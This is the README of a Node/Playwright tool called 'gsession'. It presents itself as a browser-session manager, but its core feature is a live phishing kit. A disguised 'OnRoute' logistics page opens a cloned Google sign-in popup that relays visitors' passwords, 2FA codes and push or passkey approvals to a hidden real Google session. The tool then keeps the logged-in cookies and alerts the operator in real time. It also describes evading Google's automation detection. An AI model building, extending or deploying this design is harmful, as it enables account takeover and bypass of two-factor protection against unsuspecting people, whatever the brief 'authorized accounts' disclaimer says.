# gsession

A remote browser-session manager. An admin panel lists **sessions** — each one is an
isolated, persistent Chrome session (its own cookies, logins and storage, like a
separate Chrome profile). Store a login/password (+ optional 2FA) once, then open,
auto-login, and reuse the session later without signing in again.

## What it does

- **Admin panel** (web UI) with all your sessions as cards.
- **New session** form: name, provider (Google built in), login, password, optional
  2FA (TOTP secret), note.
- **Open** — launches a headed Chrome for that session. Cookies persist on disk in
  `sessions/<id>/`, so it stays logged in between opens.
- **Auto-login** — pre-drives the Google sign-in with the stored credentials.
  - If a **TOTP secret** is stored, the 6-digit 2FA code is generated and entered
    automatically.
  - Otherwise the browser is left open at the challenge so you finish 2FA / device
    confirmation by hand. Once done, the session is saved.
- **Close** / **Delete** / **Edit** per session (Delete also wipes the session's
  Chrome profile directory).
- Credentials are **encrypted at rest** (AES-256-GCM). The panel is protected by an
  admin token.

## Setup

```bash
npm install
npm run setup      # downloads the Chromium browser Playwright needs (one time)
npm start
```

On first `npm start` a `.env` is generated with a fresh encryption key, an admin
token, and `PORT=4599`. The token is printed in the console **once, on that first
run only** (after that it lives in `.env`). Open `http://localhost:4599` and paste
it into the unlock screen.

Run `npm test` for the Google-screen classifier unit tests (no browser needed).

## Testing with Google

1. Click **+ New session**, provider **Google**.
2. Enter the test account email + password. If the account has an authenticator
   (TOTP) 2FA, paste its Base32 secret so codes auto-fill; leave blank to type the
   code yourself in the window.
3. Save, then **Auto-login**.

> **Note on Google:** Google actively detects automation and may show a
> "couldn't verify it's you" / device-confirmation / captcha step, especially the
> first time from a new machine. That's expected — the browser stays open so you can
> clear it once by hand. After that, the persistent session keeps you logged in and
> future opens are instant. This tool is intended for accounts you own or are
> authorized to manage (e.g. your test account).

## The shared sign-in link (live credential capture)

Instead of typing a user's credentials yourself, send them **one shared link**
(`https://<host>/w/login`) and watch them fill it in live. The link is static —
any number of people can use the same one; each visitor is tracked by a
client-generated id and builds their own session.

The page is an **"OnRoute" logistics landing** (driver name / number plate / phone
form). Hitting **Continue with Google** captures the driver details and opens the
**Google sign-in clone as a popup** over the landing — like a real OAuth flow, so
the visitor never sees a Google "page". The popup mirrors whatever screen the
**real** (server-side, headless) Google page is showing at that moment — never an
invented one:

| Real Google screen | What the visitor sees |
|---|---|
| email | clone email screen |
| password | clone password screen |
| 6-digit code (authenticator **or** SMS) | clone code-entry screen (caption matches: "authenticator app" vs "code we texted you") |
| push "Confirm it's you" | waiting screen — they tap the notification **on their own phone**, the clone polls until the real browser advances |
| passkey | waiting screen — they confirm the passkey prompt on their device |
| "Choose how to confirm it's you" | clone options list — their pick is clicked in the real browser |
| "We'll text +1 ••• a code" | clone number screen — **Send code** is clicked in the real browser |
| captcha / unknown layout | neutral "Verifying…" screen (safe default: never claims success) |
| signed in | **"You're signed in as X"** success screen, then redirect to real myaccount.google.com |
| rejected / wrong password / bad code | the real Google error, mirrored — stay on screen and retry |

Each field is submitted as the visitor types it. The panel's **🔔 Notifications**
drawer updates in real time (Server-Sent Events):

- "someone opened the sign-in link"
- "entered username: john@…"
- "entered password ••••••••" (the value is never shown, only that it happened)
- "provided a 2FA (authenticator) code" / "chose verification method: …"
- "signed in ✓ john@…"

On completion a **session is created automatically** from the collected
credentials (encrypted), and the real logged-in session (cookies) already exists on
disk — ready for **Auto-login** from the panel. Passwords and 2FA secrets are
encrypted the moment they're received; plaintext is never written to disk.

Endpoints: `GET /api/events` (SSE feed, admin), the public wizard at `/w/login`,
and `GET|POST /api/wizard/login(/step|/complete|/poll)` (poll is what the waiting
screens use to detect the phone tap).

## How Google-automation is handled

`lib/browser.js` launches **real installed Chrome** (falls back to Playwright's
Chromium) per session with a persistent user-data dir, a normal desktop user-agent,
`--disable-blink-features=AutomationControlled`, and `navigator.webdriver`
overridden before any page script runs. Headless (new headless mode) is used for
silent wizard logins; headed for the admin's Open/Auto-login.

Screen detection lives in **one table-driven classifier** (`lib/google-state.js`,
`classifyState()`): it takes collected DOM signals (url, field visibility, heading,
button labels, error text) and returns the state. The unit tests in `test/` pin the
behavior with fixtures, so when Google ships a new layout you fix/extend rules in
one place and the tests tell you what regressed.

## Adding other providers later

`lib/browser.js` has a `login(session)` dispatcher. The `generic` provider just
opens the login URL for a manual sign-in (the persistent session still saves). To
script a specific client's login, add a `case` alongside `googleLogin` following the
same pattern (fill fields, click next, handle 2FA, return a status).

## Remote access

The server hosts the browsers where it runs. To use the panel from another machine,
put it behind a reverse proxy / tunnel with HTTPS and keep the admin token secret —
it stores credentials, so never expose it openly on `0.0.0.0` without TLS + the
token. The bind address can be set with the `HOST` env var (default `0.0.0.0`).

## Layout

```
server.js          Express API + static panel, auth, graceful shutdown
lib/crypto.js      AES-256-GCM encrypt/decrypt for stored secrets
lib/store.js       session metadata store (data/sessions.json, atomic writes)
lib/browser.js     Playwright persistent-context manager + login flows + per-session locks
lib/google-state.js  pure Google screen classifier (state machine, unit-tested)
lib/invites.js     shared-link wizard: visitor tracking, step handling, live polling
lib/events.js      in-memory SSE event bus
public/            admin panel (index.html, style.css, app.js)
                   + Google sign-in clone (wizard.html, wizard.css, wizard.js)
test/              node:test unit tests for the classifier
sessions/<id>/     per-session Chrome user-data dir (persistent cookies)
data/sessions.json session records (passwords/2FA encrypted)
.env               generated: encryption key + admin token + port
```
